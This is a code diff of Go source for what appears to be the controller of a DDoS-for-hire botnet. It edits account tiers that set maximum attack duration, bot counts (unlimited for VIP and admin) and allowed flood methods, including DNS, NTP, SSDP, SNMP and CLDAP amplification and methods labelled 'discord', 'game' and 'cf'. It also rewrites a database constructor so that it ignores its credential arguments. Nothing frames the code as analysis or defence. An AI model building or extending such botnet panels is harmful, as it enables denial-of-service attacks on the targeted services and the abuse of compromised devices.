@@ -11,20 +11,6 @@ import (
 	"time"
 )
 
-/* ============================================================================
- * JSON DATABASE MODULE - File-based JSON Database
- * ============================================================================
- * File: database.json
- * Features:
- *   - User authentication with login logging
- *   - Account tiers: Basic, Premium, VIP, ADMIN
- *   - Attack history tracking
- *   - IP whitelist protection
- *   - API key validation
- *   - Cooldown and duration limits per tier
- * ============================================================================ */
-
-// Account tiers
 const (
 	TierBasic   = "basic"
 	TierPremium = "premium"
@@ -37,22 +23,22 @@ var TierPermissions = map[string]TierConfig{
 	TierBasic: {
 		MaxDuration:   120,
 		MaxBots:       100,
-		AttackMethods: []string{"tcp", "udp", "icmp", "http"},
+		AttackMethods: []string{"udp", "pps"},
 	},
 	TierPremium: {
 		MaxDuration:   180,
 		MaxBots:       500,
-		AttackMethods: []string{"tcp", "udp", "icmp", "http", "ovhtcp", "ovhudp", "dns-amp"},
+		AttackMethods: []string{"udp", "pps", "game", "discord", "dns-amp", "ntp-amp"},
 	},
 	TierVIP: {
 		MaxDuration:   600,
-		MaxBots:       -1, // Unlimited
-		AttackMethods: []string{"tcp", "udp", "icmp", "http", "ovhtcp", "ovhudp", "dns-amp", "ntp-amp", "ssdp-amp", "snmp-amp", "cldap-amp", "greip", "greeth", "axis-tcp", "axis-udp", "axis-l7"},
+		MaxBots:       -1,
+		AttackMethods: []string{"udp", "pps", "game", "discord", "tls", "tlsplus", "cf", "axis-l7", "dns-amp", "ntp-amp", "ssdp-amp", "snmp-amp", "cldap-amp"},
 	},
 	TierAdmin: {
-		MaxDuration:   -1, // Unlimited
-		MaxBots:       -1, // Unlimited
-		AttackMethods: []string{"tcp", "udp", "icmp", "http", "ovhtcp", "ovhudp", "dns-amp", "ntp-amp", "ssdp-amp", "snmp-amp", "cldap-amp", "greip", "greeth", "axis-tcp", "axis-udp", "axis-l7"},
+		MaxDuration:   -1,
+		MaxBots:       -1,
+		AttackMethods: []string{"udp", "pps", "game", "discord", "tls", "tlsplus", "cf", "axis-l7", "dns-amp", "ntp-amp", "ssdp-amp", "snmp-amp", "cldap-amp"},
 	},
 }
 
@@ -109,7 +95,8 @@ type Database struct {
 	config   DatabaseConfig
 }
 
-func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
+func NewDatabase(dbAddr, dbUser, dbPassword, dbName string) *Database {
+	// Note: dbAddr, dbUser, dbPassword, dbName are ignored - using JSON file database
 	db := &Database{
 		filename: "database.json",
 		config: DatabaseConfig{
